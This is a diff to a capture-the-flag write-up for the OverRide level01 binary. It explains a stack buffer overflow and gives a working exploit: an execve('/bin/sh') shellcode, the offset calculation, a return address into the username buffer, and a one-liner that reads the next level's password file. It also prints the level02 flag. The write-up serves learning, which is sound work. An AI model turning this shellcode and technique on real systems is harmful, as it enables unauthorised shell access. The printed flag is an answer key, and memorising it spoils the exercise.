@@ -11,11 +11,33 @@ variables, string references, branches, and the general program flow.
 
 ## Get the binary
 
+First read the password obtained from level00 on the host machine:
+
+```sh
+cat level00/flag
+```
+
+Connect to the VM as the next user:
+
+```sh
+ssh level01@127.0.0.1 -p 2222
+```
+
+When SSH asks for a password, paste the content of `level00/flag`.
+
+After login, the prompt should look like:
+
+```text
+level01@OverRide:~$
+```
+
 From the host machine, copy the `level01` binary from the VM:
 
 ```sh
-scp -P <port> level01@<host>:/home/users/level01/level01 ./level01/level01
+scp -P 2222 level01@127.0.0.1:/home/users/level01/level01 ./level01/level01
 ```
+
+This `scp` command asks for the same password from `level00/flag`.
 
 The local binary for analysis should be:
 
@@ -215,99 +237,160 @@ fgets(&buf, 0x64, stdin);
 `buf` is initialized as `0x40` bytes, but `fgets` can read `0x64` bytes. That
 suggests the password input may overflow the local buffer.
 
-## Finding what gets overwritten
+## Exploitation strategy
 
-The interesting part in the disassembly of `main` is:
-
-```asm
-push   ebp
-mov    ebp,esp
-push   edi
-push   ebx
-and    esp,0xfffffff0
-sub    esp,0x60
-lea    ebx,[esp+0x1c]
-...
-mov    DWORD PTR [esp+0x4],0x64
-lea    eax,[esp+0x1c]
-mov    DWORD PTR [esp],eax
-call   fgets
-...
-lea    esp,[ebp-0x8]
-pop    ebx
-pop    edi
-pop    ebp
-ret
-```
-
-So the local password buffer starts at:
-
-```text
-esp + 0x1c
-```
-
-The function later restores registers and returns using saved stack values near
-`ebp`:
-
-```text
-saved ebx  -> ebp - 0x8
-saved edi  -> ebp - 0x4
-saved ebp  -> ebp
-saved eip  -> ebp + 0x4
-```
-
-Because `fgets(&buf, 0x64, stdin)` can write more than the `0x40` bytes reserved
-for `buf`, the password input can overflow past the local buffer and reach the
-saved return address.
-
-For this binary, the useful overwrite offset is:
-
-```text
-80 bytes to reach saved EIP
-```
-
-So the password payload shape is:
-
-```text
-"A" * 80 + new_return_address
-```
-
-The username is stored globally at:
-
-```asm
-0804a040 g     O .bss   00000064 a_user_name
-```
-
-Since the username input is read before the password input:
+There are two reads from the same standard input stream:
 
 ```c
 fgets(&a_user_name, 0x100, stdin);
+fgets(&buf, 0x64, stdin);
 ```
 
-we can place data in `a_user_name`, then use the password overflow to redirect
-execution there.
+The first `fgets` can consume at most `0x100 - 1`, or 255 bytes. If the input
+does not contain a newline in those first 255 bytes, the bytes left in the
+stream are consumed by the second `fgets`.
 
-## Confirm the EIP offset
+This lets us build one continuous payload:
 
-First confirm that 80 bytes reaches saved EIP:
-
-```sh
-python -c 'print("dat_wil"); print("A" * 80 + "BBBB")' > /tmp/payload
-gdb ./level01
+```text
+username + shellcode + padding + overwritten EIP
 ```
 
-Inside GDB:
+The first 255 bytes are stored in the global username buffer. The remaining
+bytes are read into the vulnerable password buffer.
+
+## Find the cyclic offset
+
+Start the payload with the required username, fill the rest of the first input,
+then append a cyclic pattern in gdb:
 
 ```gdb
-run < /tmp/payload
+r < <(python -c 'print "dat_wil" + "\x90" * (256 - 7) + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
 ```
 
-Expected crash:
+The crash gives:
 
 ```text
 Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
+0x63413663 in ?? ()
 ```
 
-`0x42` is `B`, so `0x42424242` confirms that `"BBBB"` overwrote EIP.
+Searching this value in the cyclic pattern gives:
 
+```text
+79
+```
+
+The pattern offset is 79 because one byte from the 256-byte prefix remains
+after the first `fgets` consumes its maximum of 255 bytes. Therefore the second
+`fgets` receives:
+
+```text
+1 leftover byte + 79 pattern bytes + overwritten EIP
+```
+
+This agrees with the earlier result that saved EIP is reached after 80 bytes in
+the second buffer.
+
+## Store the shellcode
+
+Use this 21-byte `execve("/bin/sh")` shellcode:
+
+```text
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+```
+
+Equivalent x86 instructions:
+
+```asm
+xor  ecx, ecx        ; ecx = 0
+mul  ecx             ; eax = 0 and edx = 0
+mov  al, 0x0b        ; Linux syscall 11: execve
+push ecx             ; null terminator
+push 0x68732f2f      ; "//sh"
+push 0x6e69622f      ; "/bin"
+mov  ebx, esp        ; ebx points to "/bin//sh"
+int  0x80            ; execute the syscall
+```
+
+For 32-bit Linux, `execve` expects:
+
+```text
+eax = 11          syscall number
+ebx = "/bin//sh" filename
+ecx = 0           argv
+edx = 0           envp
+```
+
+The shellcode avoids null bytes inside the injected byte sequence because a
+null byte could terminate string-based input handling before the full payload
+is copied.
+
+The global username buffer starts at:
+
+```text
+0x0804a040
+```
+
+The first seven bytes must contain `dat_wil`. The shellcode begins immediately
+afterward, at:
+
+```text
+0x0804a040 + 7 = 0x0804a047
+```
+
+On x86, the address must be written in little-endian byte order:
+
+```text
+0x0804a047 -> \x47\xa0\x04\x08
+```
+
+The expression below starts with the address in normal byte order and reverses
+it:
+
+```python
+"\x08\x04\xa0\x47"[::-1]
+```
+
+## Final exploit
+
+The padding calculation is:
+
+```python
+padding = "X" * (256 - len(user + shellcode) + 79)
+```
+
+Why:
+
+- `256 - len(user + shellcode)` fills the first-input region.
+- `+ 79` reaches saved EIP after the one byte left by the first `fgets`.
+- the final four bytes replace saved EIP with `0x0804a047`.
+
+Run:
+
+```sh
+(python -c '''
+user = "dat_wil"
+shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+padding = "X" * (256 - len(user + shellcode) + 79)
+
+print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]
+'''; echo 'cat /home/users/level02/.pass') | ./level01
+```
+
+The username check reads `dat_wil`, the shellcode remains in `a_user_name`, the
+second `fgets` overflows saved EIP, and execution returns to the shellcode at
+`0x0804a047`.
+
+The flag is:
+
+```text
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
+
+You can now acces to level02:
+
+```sh
+ssh level02@127.0.0.1 -p 2222
+password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
